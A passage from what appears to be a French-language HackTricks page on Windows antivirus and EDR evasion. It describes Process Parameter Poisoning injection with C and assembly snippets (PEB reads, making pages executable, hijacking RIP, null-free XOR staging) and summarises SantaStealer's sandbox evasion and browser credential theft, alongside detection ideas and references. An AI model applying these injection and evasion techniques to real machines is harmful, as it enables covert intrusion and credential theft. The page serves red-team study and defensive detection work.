   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flux minimal :

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Exécution du buffer de paramètres copié

La région de paramètres copiée est généralement `RW`, et non exécutable. Une chaîne P3 courante est la suivante :

1. Créer le processus normalement (sans le suspendre)
2. Rendre la page de paramètres choisie exécutable avec `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Réutiliser le handle du thread principal déjà renvoyé dans `PROCESS_INFORMATION`
4. Rediriger l’exécution avec `NtSetContextThread` (`CONTEXT_CONTROL`, écrasement de `RIP`)

Contrairement aux workflows classiques de détournement de thread, cela **ne nécessite pas** `SuspendThread` / `ResumeThread` ; le contexte peut être modifié directement à l’aide du handle du thread principal renvoyé.

Cela évite plusieurs API fréquemment surveillées pour détecter l’injection :

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- souvent aussi `SuspendThread` / `ResumeThread`

### Limitation des octets nuls et shellcode par étapes

Les trois vecteurs sont des **données de type chaîne**, donc une charge utile brute contenant `0x00` est tronquée lors du transfert. Une solution pratique consiste à utiliser une **première étape sans octet nul** qui reconstruit les constantes à l’exécution, puis charge une seconde étape arbitraire.

Un schéma simple consiste à synthétiser les constantes avec XOR :

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Cela permet à la première étape de construire des chaînes sur la pile, des arguments d’API, des chemins de DLL ou un chargeur de shellcode de seconde étape sans intégrer d’octets nuls dans le paramètre transmis.

### Appels d’API basés sur la pile depuis la première étape

Lorsque la première étape doit appeler des API telles que `LoadLibraryA`, elle peut :

- pousser la chaîne/le tampon sur la pile de la cible
- réserver le **shadow space x64 de 32 octets**
- définir `RCX`, `RDX`, `R8`, `R9` avec des constantes ou des pointeurs relatifs à `RSP`
- maintenir `RSP` **aligné sur 16 octets** avant l’appel

Une seconde étape peut ensuite être copiée de la pile dans une allocation `PAGE_READWRITE`, basculée en `PAGE_EXECUTE_READ` avec `VirtualProtect`, puis exécutée par saut, évitant ainsi une allocation RWX directe.

### Idées de détection

Bonnes pistes de détection mentionnées par les auteurs :

- `VirtualProtectEx` / `NtProtectVirtualMemory` rendant exécutables les **pages des paramètres de processus**
- ce changement de protection suivi de `SetThreadContext` / `NtSetContextThread`
- lectures à distance du `PEB`, puis de `RTL_USER_PROCESS_PARAMETERS`
- valeurs `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` inhabituellement longues ou à forte entropie lors de la création d’un processus

### Remarques

- P3 est une **technique de transfert interprocessus**, pas une primitive d’exécution complète à elle seule : le paramètre copié nécessite toujours un changement de permission d’exécution et une méthode de redirection de l’exécution.
- `RtlCreateProcessReflection` / Dirty Vanity a été envisagé par les auteurs, mais écarté, car il fait appel en interne à des primitives suspectes telles que `NtWriteVirtualMemory` et `NtCreateThreadEx`.

## Tactiques de SantaStealer pour l’évasion sans fichier et le vol d’identifiants

SantaStealer (alias BluelineStealer) illustre la manière dont les voleurs d’informations modernes combinent le contournement de l’AV, l’anti-analyse et l’accès aux identifiants dans un même flux de travail.<sup>[[24]](#references)</sup>

### Filtrage par disposition du clavier et délai dans le sandbox

- Un indicateur de configuration (`anti_cis`) énumère les dispositions de clavier installées via `GetKeyboardLayoutList`. Si une disposition cyrillique est trouvée, l’échantillon crée un marqueur `CIS` vide et s’arrête avant d’exécuter les stealers, ce qui garantit qu’il ne se déclenche jamais dans les régions exclues, tout en laissant une trace utile à la détection.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logique `check_antivm` à plusieurs niveaux

- La variante A examine les processus et certaines informations système afin de repérer des environnements d’analyse ou de virtualisation.
- La variante B vérifie des propriétés système et des indices temporels. Toute détection interrompt l’exécution avant le lancement des modules.

### Helper sans fichier et chargement réflexif

- Le binaire principal intègre un helper lié aux identifiants Chromium, exécuté depuis le disque ou chargé en mémoire.
- Le helper déchiffre puis charge une DLL de seconde étape, qui vise à extraire des données de navigateurs Chromium. Elle s’appuie sur [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>

### Collecte modulaire en mémoire et exfiltration

- `create_memory_based_log` lance des modules de collecte pour différentes applications et catégories de fichiers, puis rassemble leurs résultats.
- Les données collectées sont archivées, puis envoyées au serveur de commande et de contrôle en plusieurs segments.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

{{#include ../banners/hacktricks-training.md}}
